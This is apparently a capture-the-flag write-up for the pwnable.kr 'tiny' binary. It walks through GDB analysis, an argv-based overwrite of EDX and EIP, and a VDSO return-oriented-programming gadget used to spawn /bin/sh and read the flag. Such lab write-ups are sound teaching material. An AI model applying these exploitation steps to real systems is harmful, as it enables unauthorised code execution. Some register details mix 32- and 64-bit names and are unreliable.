Solution of TINY (medium) exploitaion. The challenge quite complex and hard to exploit (trivial). Let's start inspecting the binary.

Real size of vulnerable binary. It's indeed tiny! We don't seem much strings inside the binary except "ELF" which is the header of linux binary. 
tiny@ubuntu:/tmp/babi$ hexdump -C ./tiny
00000000  7f 45 4c 46 01 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
00000010  02 00 03 00 01 00 00 00  74 80 04 08 34 00 00 00  |........t...4...|
00000020  00 00 00 00 00 00 00 00  34 00 20 00 02 00 00 00  |........4. .....|
00000030  00 00 00 00 01 00 00 00  00 00 00 00 00 80 04 08  |................|
00000040  00 80 04 08 7c 00 00 00  7c 00 00 00 05 00 00 00  |....|...|.......|
00000050  00 10 00 00 51 e5 74 64  00 00 00 00 00 00 00 00  |....Q.td........|
00000060  00 00 00 00 00 00 00 00  00 00 00 00 06 00 00 00  |................|
00000070  10 00 00 00 58 5a 8b 12  ff d2                    |....XZ....|
0000007a


We try to disassemble the binary using objdump and IDA Pro. However, there's no luck with it.

tiny@ubuntu:/tmp/babi$ objdump -D ./tiny
./tiny:     file format elf32-i386


Since there is not much information about the binary, we choose to debug it. At first, we need to set breakpoint on the unmapped address before the actual process executed. 

tiny@ubuntu:/tmp/babi$ gdb -q ./tiny
Reading symbols from /tmp/babi/tiny...(no debugging symbols found)...done.
(gdb) b * 0
Breakpoint 1 at 0x0


Once we set the breakpoint, we can continue to execute. If you try to execute the binary, you should be able to encounter the issue:

(gdb) r
Starting program: /tmp/babi/tiny 
Warning:
Cannot insert breakpoint 1.
Error accessing memory address 0x0: Input/output error.


This error means nothing since it is already executed in the memory. To verify the execution in the memory, we can check the registers.

(gdb) i r
eax            0x0	0
ecx            0x0	0
edx            0x0	0
ebx            0x0	0
esp            0xffffdc10	0xffffdc10
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x8048074	0x8048074
eflags         0x200	[ IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x0	0
(gdb) 


Voila. It seems that we were able to see something in the register. Let's take a look into the EIP register. The register seems to have interesting address, 0x8048074. We can inspect the address inside the memory.

(gdb) x/10x 0x8048074
0x8048074:	0x128b5a58	0x0000d2ff	0x00000000	0x00000000
0x8048084:	0x00000000	0x00000000	0x00000000	0x00000000
0x8048094:	0x00000000	0x00000000


Seems that offset 0x8048074 is pointing to some instructions. The hex value of 0x128b5a58 and 0x0000d2ff is the only value that exists on the memory. Since it is a little-endian, we can convert the value as in the following:

	i. 0x128b5a58 = 58 5a 8b 12
	ii. 0x0000d2ff = ff d2

	Manual convert:
		- 58 = pop eax
		- 5a = pop edx
		- 8b 12 = mov edx, DWORD PTR[edx]
		- ff d2 = call edx


The instruction can be extract using GDB. 

(gdb) x/30i 0x8048074
=> 0x8048074:	pop    %eax
   0x8048075:	pop    %edx
   0x8048076:	mov    (%edx),%edx
   0x8048078:	call   *%edx
   0x804807a:	add    %al,(%eax)
   0x804807c:	add    %al,(%eax)
   0x804807e:	add    %al,(%eax)


The program only containing few instructions. The question now is how do we write a ROP for this kind of vulnerability. As we can see EDX is basically is the last instruction being call. At the beginning, EDX value will be pop out and will copy / overwrite its data into EDX. Whatever data overwritten, it will be call. This will require proper ROP to prevent segmentation fault. To prove that we can overwrite something in the memory, we wrote a small program that call to the program and overwrite with some data "ABCD". Following the example small program we wrote:

/* small_overwrite.c */
#include <unistd.h>

void main()
{
	execlp("/home/yuri/pwnable_kr/tiny","ABCD",  0);
}


Once we compile the code, we debug the binary we compiled just now. Here we don't need to put any breakpoint and we need to observer the memory and its registers. 

tiny@ubuntu:/tmp/babi$ gdb -q ./small
Reading symbols from /tmp/babi/small...(no debugging symbols found)...done.
(gdb) r
Starting program: /tmp/babi/small 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x2aaaaaacd000
process 44421 is executing new program: /home/tiny/tiny
warning: Selected architecture i386 is not compatible with reported target architecture i386:x86-64
Architecture of file not recognized.
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000044434241 in ?? ()


We were able to see the program has been caught by SIGSEGV with final offset in stack, 0x0000000044434241. The program manage to overwrite data into the memory (EDX) and EIP. We printed out backtrace memory to see the execution in the stack.

(gdb) bt
#0  0x0000000044434241 in ?? ()
#1  0x000000000804807a in ?? ()


Registers overwritten:

(gdb) i r
rax            0x1	1
rbx            0x0	0
rcx            0x0	0
rdx            0x44434241	1145258561
rsi            0x0	0
rdi            0x0	0
rbp            0x0	0x0
rsp            0xffbadde4	0xffbadde4
r8             0x0	0
r9             0x0	0
r10            0x0	0
r11            0x0	0
r12            0x0	0
r13            0x0	0
r14            0x0	0
r15            0x0	0
rip            0x44434241	0x44434241
eflags         0x10202	[ IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0


With this information, we can see the potential of exploitation in the binary. However, we still need to figure out how we going to execute something like /bin/sh in the memory in order for us to perform further exploitation. So how the program actually works? It is accepting few arguments (see the small program we wrote) and allows the execution. The binary actually pointing to its actual address 0x6d6f682f ('/hom'). This is one of the argument executed upon running the binary. Inner working of the program:
	i. arguments
	ii. environment

Here we can get some clue that the program basically works like:
	- int main(int argc. char *argv[], char *envp[])

Example of the stack layout (https://www.win.tue.nl/~aeb/linux/hh/stack-layout.html):

	local variables of main
	saved registers of main
	return address of main
	argc
	argv
	envp
	stack from startup code
	argc
	argv pointers
	NULL that ends argv[]
	environment pointers
	NULL that ends envp[]
	ELF Auxiliary Table
	argv strings
	environment strings
	program name
	NULL


The binary itself was enable with NX. Our challenge is where should we jump to since the NX is enabled. So now let's inspect the RSP register. As for now, we manage to overwrite something into RDX and RIP. Thus, we need something that can help us to jump out of the store registers and execute /bin/sh. RSP register inspection:

(gdb) x/100wx $rsp
0xffbadde4:	0x0804807a	0x00000000	0xffbaed61	0xffbaed76
0xffbaddf4:	0xffbaed8d	0xffbaeda5	0xffbaedb5	0xffbaedc0
0xffbade04:	0xffbaede4	0xffbaedfb	0xffbaee0f	0xffbaee19
0xffbade14:	0xffbaee32	0xffbaee3e	0xffbaee8b	0xffbaee9f
0xffbade24:	0xffbaeeae	0xffbaeecc	0xffbaeeda	0xffbaeeeb
0xffbade34:	0xffbaef06	0xffbaef4c	0xffbaef55	0xffbaef65
0xffbade44:	0xffbaef6d	0xffbaef7d	0xffbaef8a	0xffbaefc0
0xffbade54:	0xffbaefd4	0x00000000	0x00000020	0x55557b50
0xffbade64:	0x00000021	0x55557000	0x00000010	0x0fabfbff
0xffbade74:	0x00000006	0x00001000	0x00000011	0x00000064
0xffbade84:	0x00000003	0x08048034	0x00000004	0x00000020
0xffbade94:	0x00000005	0x00000002	0x00000007	0x00000000
0xffbadea4:	0x00000008	0x00000000	0x00000009	0x08048074
0xffbadeb4:	0x0000000b	0x000003f8	0x0000000c	0x000003f8
0xffbadec4:	0x0000000d	0x000003f8	0x0000000e	0x000003f8
0xffbaded4:	0x00000017	0x00000000	0x00000019	0xffbadf0b
0xffbadee4:	0x0000001f	0xffbaefe8	0x0000000f	0xffbadf1b
0xffbadef4:	0x00000000	0x00000000	0x00000000	0x00000000
0xffbadf04:	0x00000000	0x6c000000	0x3072fe15	0x08677d1b
0xffbadf14:	0x7d51d6d8	0x69a4eab6	0x00363836	0x00000000
0xffbadf24:	0x00000000	0x00000000	0x00000000	0x00000000
0xffbadf34:	0x00000000	0x00000000	0x00000000	0x00000000
0xffbadf44:	0x00000000	0x00000000	0x00000000	0x00000000
0xffbadf54:	0x00000000	0x00000000	0x00000000	0x00000000
0xffbadf64:	0x00000000	0x00000000	0x00000000	0x00000000


Now ROPing time. We can find a useful gadget from VDSO. VDSO ASLR is known to be wekear than ASLR on other sections (SROP FTW). VDSO can be bruteforce 256 times. However, we don't want to waste time to do brute forcing. Inspecting for ROP gadget:

(gdb) x/10xi 0x55557000
   0x555575bc:	mov    %ebx,%edx
   0x555575be:	mov    0x8(%rbp),%ebx
   0x555575c1:	callq  0x55557b50
   0x555575c6:	mov    %edx,%ebx
   0x555575c8:	add    $0x3c,%esp
   0x555575cb:	pop    %rbx
   0x555575cc:	pop    %rsi
   0x555575cd:	pop    %rdi
   0x555575ce:	pop    %rbp
   0x555575cf:	retq   


How does the gadget help here? We can use __kernel_vsyscall to execute our payload in the memory. In the ASM code above, data overwritten in the EDX will copy into EBX and this will be call to offset 0x55557b50. The offset 0x55557b50 as in following instructions:

(gdb) x/10xi 0x55557b50
   0x55557b50:	push   %rcx
   0x55557b51:	push   %rdx
   0x55557b52:	push   %rbp
   0x55557b53:	mov    %esp,%ebp
   0x55557b55:	sysenter 
   0x55557b57:	nop
   0x55557b58:	nop
   0x55557b59:	nop
   0x55557b5a:	nop
   0x55557b5b:	nop


At the offset 0x555575c8, stack pointer will be increase and then our RBX will be pop (which is our execv() here). Our final exploitation will look like this:

ENVP - [env_var1][env_var2][env_var3][/bin/sh][env_var5][NULL]
EXEC - [binary][rop_gadget_vdso][buf][buf][buf][buf][buf][buf][buf][buf][buf][buf][NULL][ENVP]


Last one, is to construct the exploit, compiling and executing it. Before executing the exploit, we need to change the limit of ulimit. Following are the exploitation details:

tiny@ubuntu:/tmp/babi$ gcc -o exploit exploit.c 
exploit.c: In function ‘main’:
exploit.c:10:2: warning: missing sentinel in function call [-Wformat]
tiny@ubuntu:/tmp/babi$ ulimit -s unlimited
tiny@ubuntu:/tmp/babi$ ./exploit 
$ cat /home/tiny/flag
<removed>


Having fun solving it. Shout to 'perzik' who asking me to play pwnable.kr :)


